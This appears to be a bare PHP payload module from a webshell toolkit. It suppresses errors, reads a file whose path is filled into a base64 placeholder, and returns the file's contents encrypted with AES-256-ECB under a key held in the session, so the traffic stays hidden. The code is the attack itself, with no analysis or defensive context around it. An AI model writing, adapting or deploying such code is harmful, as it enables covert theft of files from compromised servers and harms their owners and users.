
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    return ($s0 == $str) ? $s0 : iconv('gbk', 'utf-8//IGNORE', $str);
}

function _readFile($path)
{
    $contents = file_get_contents($path);
    if (function_exists("mb_convert_encoding")) {
        $charset = mb_detect_encoding($contents, array('UTF-8', 'GBK', 'GB2312', 'UTF-16', 'UCS-2', 'BIG5', 'ASCII'));
        if ($charset) {
            $contents = mb_convert_encoding($contents, "UTF-8", $charset);
        }
    }
    return getSafeStr($contents);
}

error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$file = base64_decode('__FILE__');
$data = array(
    "file" => $file,
    "status" => is_readable($file),
    "contents" => base64_encode(_readFile($file))
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
